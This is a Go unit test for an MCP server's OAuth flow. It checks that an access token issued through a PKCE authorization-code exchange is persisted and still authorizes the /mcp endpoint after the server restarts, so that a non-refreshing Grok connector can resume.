// TestAccessTokenSurvivesServerRestart verifies the Grok fix: a connector (Grok's
// rmcp/connectors-manager) that does NOT refresh on a 401 must be able to resume
// after the server process restarts, because its still-unexpired access token is
// persisted and reloaded into the fresh process. If access tokens were only
// in-memory, the restart would wipe them and Grok would be stuck at "auth
// required" until a full re-authorize, whereas Claude/ChatGPT would recover by
// refreshing.
func TestAccessTokenSurvivesServerRestart(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "oauth.db")

	cfg := oauth.DefaultConfig()
	cfg.Issuer = "https://mcp.example.com/mcp"
	newServer := func() *OAuthServer {
		as, store, err := OpenOAuthStore(path, cfg)
		require.NoError(t, err)
		srv := NewOAuthServer(testSecret, "https://mcp.example.com", as, store)
		require.NoError(t, store.SaveClient(oauth.Client{
			ClientID:          "cli",
			RedirectURIs:      []string{"http://localhost/cb"},
			GrantTypes:        []string{"authorization_code", "refresh_token"},
			ResponseTypes:     []string{"code"},
			TokenEndpointAuth: "none",
			IsActive:          true,
		}))
		return srv
	}

	o := newServer()

	// Complete an authorization-code exchange, capturing the access token.
	verifier, challenge := testPKCE()
	const res = "https://mcp.example.com/mcp"
	rec := httptest.NewRecorder()
	o.AuthorizePOST(rec, formPost(map[string]string{
		"response_type": "code", "client_id": "cli", "redirect_uri": "http://localhost/cb",
		"password": testSecret, "code_challenge": challenge, "code_challenge_method": "S256", "resource": res,
	}))
	require.Equal(t, http.StatusFound, rec.Code)
	loc, _ := url.Parse(rec.Header().Get("Location"))
	code := loc.Query().Get("code")

	rec = httptest.NewRecorder()
	o.TokenHandler(rec, formPost(map[string]string{
		"grant_type": "authorization_code", "code": code, "client_id": "cli",
		"redirect_uri": "http://localhost/cb", "code_verifier": verifier, "resource": res,
	}))
	require.Equal(t, http.StatusOK, rec.Code)
	var tok map[string]any
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&tok))
	access := tok["access_token"].(string)
	require.NotEmpty(t, access)
	require.True(t, o.validToken(access), "issued token must be valid in the issuing server")

	// Simulate the server process dying (closes the durable store).
	o.Stop()

	// A fresh process on the same DB must still accept the still-valid token.
	o2 := newServer()
	defer o2.Stop()
	require.True(t, o2.validToken(access), "persisted access token must survive a restart")

	bound := o2.OfficialMiddleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	rec = httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodPost, "/mcp", nil)
	req.Header.Set("Authorization", "Bearer "+access)
	bound.ServeHTTP(rec, req)
	assert.Equal(t, http.StatusOK, rec.Code, "reloaded access token must authorize the MCP endpoint")
}
